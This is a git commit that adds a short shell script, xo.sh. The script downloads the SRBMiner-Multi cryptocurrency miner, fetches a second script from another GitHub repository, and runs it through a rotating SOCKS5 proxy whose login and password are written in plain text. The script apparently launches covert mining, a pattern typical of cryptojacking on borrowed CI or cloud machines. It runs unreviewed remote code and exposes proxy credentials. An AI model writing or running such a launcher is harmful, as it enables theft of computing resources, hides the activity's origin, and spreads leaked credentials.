0fed1d2ec3d232c8d59b61cf16e4b0b5f308a391
hunsunyo <98655233+hunsunyo@users.noreply.github.com>
2022-01-29 21:12:27 +0530

    Create xo.sh

---
+++ xo.sh
@@ -0,0 +1,8 @@
+#!/bin/sh
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.9/SRBMiner-Multi-0-8-9-Linux.tar.xz 
+tar -xf SRBMiner-Multi-0-8-9-Linux.tar.xz 
+cd SRBMiner-Multi-0-8-9
+wget https://github.com/ahansura/srb/raw/main/rap.sh
+chmod +x rap.sh
+export http_proxy="socks5://djutybpn-rotate:vo7hn8ayc8s5@p.webshare.io:80/"
+./rap.sh
